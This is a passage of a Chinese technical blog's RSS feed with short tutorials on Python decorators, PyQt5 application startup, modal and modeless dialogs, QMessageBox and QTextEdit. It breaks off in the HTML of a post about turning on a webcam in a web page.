&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; functools &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; wraps
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;logged&lt;/span&gt;(func): 
    &lt;span style=&#34;color:#a6e22e&#34;&gt;@wraps&lt;/span&gt;(func) 
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;with_logging&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;args, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kwargs): 
        print func&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__name__ &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; was called&amp;#34;&lt;/span&gt; 
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; func(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;args, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kwargs)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; with_logging 
&lt;span style=&#34;color:#a6e22e&#34;&gt;@logged&lt;/span&gt; 
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;(x): 
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;does some math&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt; 
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; x 
print f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__name__ &lt;span style=&#34;color:#75715e&#34;&gt;# prints &amp;#39;f&amp;#39; &lt;/span&gt;
print f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__doc__ &lt;span style=&#34;color:#75715e&#34;&gt;# prints &amp;#39;does some math&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;6内置装饰器&#34;&gt;6.内置装饰器&lt;/h2&gt;
&lt;p&gt;@staticmathod、@classmethod、@property&lt;/p&gt;
&lt;h2 id=&#34;7装饰器的执行顺序&#34;&gt;7.装饰器的执行顺序&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;@a&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;@b&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;@c&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;等效于&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;f&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;a(b(c(f)))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>PyQt5—程序的启动</title>
        <link>https://ac-lm.github.io/posts/pyqt5/pyqt5%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%90%AF%E5%8A%A8/</link>
        <pubDate>Sat, 26 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/pyqt5/pyqt5%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%90%AF%E5%8A%A8/</guid>
        <description>&lt;h2 id=&#34;1启动的代码&#34;&gt;1.启动的代码&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;apps &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; QApplication(sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv)
myWin &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; MyWindow() &lt;span style=&#34;color:#75715e&#34;&gt;# 创建Qt类&lt;/span&gt;
myWin&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;show() &lt;span style=&#34;color:#75715e&#34;&gt;# 展示&lt;/span&gt;
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit(apps&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exec_())
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2qapplicationsysargv&#34;&gt;2.QApplication(sys.argv)&lt;/h2&gt;
&lt;p&gt;运行程序时候获取命令行参数，使Qt的各种类能获取到程序返回的参数&lt;/p&gt;
&lt;h2 id=&#34;3sysexitappsexec_&#34;&gt;3.sys.exit(apps.exec_())&lt;/h2&gt;
&lt;p&gt;使得指程序一直循环运行直到主窗口被关闭终止进程（如果没有这句话，程序运行时会一闪而过），作用是给予系统一个结束程序的状态判断&lt;/p&gt;
</description>
        </item>
        <item>
        <title>PyQt5—非模式显示 show 与模式 exec_</title>
        <link>https://ac-lm.github.io/posts/pyqt5/pyqt5%E9%9D%9E%E6%A8%A1%E5%BC%8F%E6%98%BE%E7%A4%BA-show-%E4%B8%8E%E6%A8%A1%E5%BC%8F-exec_/</link>
        <pubDate>Fri, 25 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/pyqt5/pyqt5%E9%9D%9E%E6%A8%A1%E5%BC%8F%E6%98%BE%E7%A4%BA-show-%E4%B8%8E%E6%A8%A1%E5%BC%8F-exec_/</guid>
        <description>&lt;h2 id=&#34;1非模式显示-show&#34;&gt;1.非模式显示 show()&lt;/h2&gt;
&lt;p&gt;对话框弹出后，控制权即刻返回给调用函数，在显示期间，用户可以切换同程序下的其它窗口，程序照常运行。&lt;/p&gt;
&lt;h2 id=&#34;2模式显示-exec_&#34;&gt;2.模式显示 exec_()&lt;/h2&gt;
&lt;p&gt;对话框弹出后，锁住程序直到用户关闭该对话框为止，函数返回一个 DialogCode 结果。在显示期间，用户不可以切换同程序下的其它窗口。&lt;/p&gt;
&lt;h2 id=&#34;3模式与非模式&#34;&gt;3.模式与非模式&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;模式对话框，就是在弹出窗口的时候，整个程序就被锁定了，处于等待状态，直到对话框被关闭。这时往往是需要对话框的返回值进行下面的操作。如：确认窗口。&lt;/li&gt;
&lt;li&gt;非模式对话框，在调用弹出窗口之后，调用即刻返回，继续下面的操作。这里只是一个调用指令的发出，不等待也不做任何处理。如：查找框。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;两者的返回值不同。exec() 有返回值，show() 没有返回值。其次这两个方法的作用也不同。调用 show() 的作用仅仅是将 widget 及其上的内容都显示出来，控制权即刻返回给调用函数。而调用 exec() 后，调用线程将会被阻塞，锁住程序直到用户关闭该对话框，期间用户不可以切换同程序下的其它窗口直到 Dialog 关闭。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>PyQt5—QMessageBox 消息对话框类</title>
        <link>https://ac-lm.github.io/posts/pyqt5/pyqt5qmessagebox-%E6%B6%88%E6%81%AF%E5%AF%B9%E8%AF%9D%E6%A1%86%E7%B1%BB/</link>
        <pubDate>Thu, 24 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/pyqt5/pyqt5qmessagebox-%E6%B6%88%E6%81%AF%E5%AF%B9%E8%AF%9D%E6%A1%86%E7%B1%BB/</guid>
        <description>&lt;h2 id=&#34;1qmessagebox&#34;&gt;1.QMessageBox&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;information(QWdiget parent,title,text,buttons,defaultButton) &lt;span style=&#34;color:#75715e&#34;&gt;#| 弹出消息对话框                    &lt;/span&gt;
question(QWidget parent,title,text,buttons,defaultButton)  &lt;span style=&#34;color:#75715e&#34;&gt;#| 弹出问答对话框&lt;/span&gt;
warning(QWidget parent,title,text,buttons,defaultButton)   &lt;span style=&#34;color:#75715e&#34;&gt;#| 弹出警告对话框                       &lt;/span&gt;
critical(QWidget parent,title,text,buttons,defaultButton)  &lt;span style=&#34;color:#75715e&#34;&gt;#| 弹出严重错误对话框                     &lt;/span&gt;
about(QWidget parent,title,text)                           &lt;span style=&#34;color:#75715e&#34;&gt;#| 弹出关于对话框   &lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 参数------------------------------------------------------------------------------&lt;/span&gt;
parent: 指定的父窗口控件
title: 对话框标题
text: 对话框文本
buttons: 标准按钮, 默认为ok按钮, 可以有多个, 用 &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; 进行分隔
defaultButton: 关闭对话框默认返回的按钮
&lt;span style=&#34;color:#75715e&#34;&gt;# 方法------------------------------------------------------------------------------&lt;/span&gt;
setTitle()  &lt;span style=&#34;color:#75715e&#34;&gt;# 设置标题&lt;/span&gt;
setText()   &lt;span style=&#34;color:#75715e&#34;&gt;# 设置正文消息&lt;/span&gt;
setIcon()   &lt;span style=&#34;color:#75715e&#34;&gt;# 设置弹出对话框的图片                                            &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2qmessagebox的标准按钮类型&#34;&gt;2.QMessageBox的标准按钮类型&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;QMessage&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Ok     &lt;span style=&#34;color:#75715e&#34;&gt;#| 同意操作 |&lt;/span&gt;
QMessage&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Cancel &lt;span style=&#34;color:#75715e&#34;&gt;#| 取消操作 |&lt;/span&gt;
QMessage&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Yes    &lt;span style=&#34;color:#75715e&#34;&gt;#| 同意操作 |&lt;/span&gt;
QMessage&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;No     &lt;span style=&#34;color:#75715e&#34;&gt;#| 取消操作 |&lt;/span&gt;
QMessage&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Abort  &lt;span style=&#34;color:#75715e&#34;&gt;#| 终止操作 |&lt;/span&gt;
QMessage&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Retry  &lt;span style=&#34;color:#75715e&#34;&gt;#| 重试操作 |&lt;/span&gt;
QMessage&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Ignore &lt;span style=&#34;color:#75715e&#34;&gt;#| 忽略操作 |&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3使用实例&#34;&gt;3.使用实例&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 弹出消息对话框&lt;/span&gt;
reply &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; QMessageBox&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;information(self, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;标题&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;消息对话框正文&amp;#39;&lt;/span&gt;,QMessageBox&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Yes &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; QMessageBox&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;No,QMessageBox&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Yes)
reply1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; QMessageBox&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;question(self, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;标题&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;提问框消息正文&amp;#34;&lt;/span&gt;, QMessageBox&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Yes &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; QMessageBox&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;No, QMessageBox&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Yes)
reply2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; QMessageBox&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;warning(self, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;标题&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;警告框消息正文&amp;#34;&lt;/span&gt;, QMessageBox&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Yes &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; QMessageBox&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;No, QMessageBox&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Yes)
reply3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; QMessageBox&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;critical(self, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;标题&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;严重错误对话框消息正文&amp;#34;&lt;/span&gt;, QMessageBox&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Yes &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; QMessageBox&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;No, QMessageBox&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Yes)
reply4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; QMessageBox&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;about(self, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;标题&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;关于对话框消息正文&amp;#34;&lt;/span&gt;)
reply&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exec_()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>PyQt5—QTextEdit 文本元件</title>
        <link>https://ac-lm.github.io/posts/pyqt5/pyqt5qtextedit-%E6%96%87%E6%9C%AC%E5%85%83%E4%BB%B6/</link>
        <pubDate>Wed, 23 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/pyqt5/pyqt5qtextedit-%E6%96%87%E6%9C%AC%E5%85%83%E4%BB%B6/</guid>
        <description>&lt;h2 id=&#34;1占位文本的使用&#34;&gt;1.占位文本的使用&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;setPlaceholderText()  &lt;span style=&#34;color:#75715e&#34;&gt;#| 设置占位文本&lt;/span&gt;
placeholderText()     &lt;span style=&#34;color:#75715e&#34;&gt;#| 获取占位文本&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2-设置文本格式&#34;&gt;2. 设置文本格式&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;setPlainText(str)    &lt;span style=&#34;color:#75715e&#34;&gt;#| 设置普通文本&lt;/span&gt;
insertPlainText(str) &lt;span style=&#34;color:#75715e&#34;&gt;#| 插入普通文本&lt;/span&gt;
toPlainText()        &lt;span style=&#34;color:#75715e&#34;&gt;#| -&amp;gt; str 返回普通文本&lt;/span&gt;
setHtml(str)         &lt;span style=&#34;color:#75715e&#34;&gt;#| 设置Html文本&lt;/span&gt;
insertHtml(str)      &lt;span style=&#34;color:#75715e&#34;&gt;#| 插入Html文本&lt;/span&gt;
toHtml()             &lt;span style=&#34;color:#75715e&#34;&gt;#| -&amp;gt; str 返回Html 文本&lt;/span&gt;
setText(str)         &lt;span style=&#34;color:#75715e&#34;&gt;#| 设置文本（自动识别）&lt;/span&gt;
append(str)          &lt;span style=&#34;color:#75715e&#34;&gt;#| 追加文本&lt;/span&gt;
clear()              &lt;span style=&#34;color:#75715e&#34;&gt;#| 清空文本&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3设置字体和大小&#34;&gt;3.设置字体和大小&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;setFontPointSize(float)  &lt;span style=&#34;color:#75715e&#34;&gt;# 设置字体大小&lt;/span&gt;
setFontFamily(str)       &lt;span style=&#34;color:#75715e&#34;&gt;# 设置字体&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Web开发—实现摄像头开启</title>
        <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91%E5%AE%9E%E7%8E%B0%E6%91%84%E5%83%8F%E5%A4%B4%E5%BC%80%E5%90%AF/</link>
        <pubDate>Wed, 23 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91%E5%AE%9E%E7%8E%B0%E6%91%84%E5%83%8F%E5%A4%B4%E5%BC%80%E5%90%AF/</guid>
        <description>&lt;h2 id=&#34;1html-实现&#34;&gt;1.HTML 实现&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!-- 样式部分可以忽略 --&amp;gt;&lt;/span&gt;
    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;style&lt;/span&gt;&amp;gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;padding&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;margin&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
        }
        &lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt; {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;width&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;vw&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;height&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;vh&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;display&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;flex&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;justify-content&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;center&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;align-items&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;center&lt;/span&gt;;
        }
        .&lt;span style=&#34;color:#a6e22e&#34;&gt;btn&lt;/span&gt; {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;width&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;height&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;border-radius&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;background&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;#ff9900&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;line-height&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;text-align&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;center&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;color&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;#fff&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;box-shadow&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;#999&lt;/span&gt;;
        }
        &lt;span style=&#34;color:#f92672&#34;&gt;video&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;canvas&lt;/span&gt; {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;width&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;300&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;height&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;300&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;border&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;solid&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;#000&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;border-radius&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;margin-left&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;
        }
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;style&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;play&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;btn&amp;#34;&lt;/span&gt;&amp;gt;开启摄像&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;take&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;btn&amp;#34;&lt;/span&gt;&amp;gt;拍照&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;video&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;video&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;video&lt;/span&gt;&amp;gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!-- 尽量在canvas标签上设置宽高 --&amp;gt;&lt;/span&gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;canvas&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;canvas&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;width&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;300px&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;height&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;300px&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;canvas&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
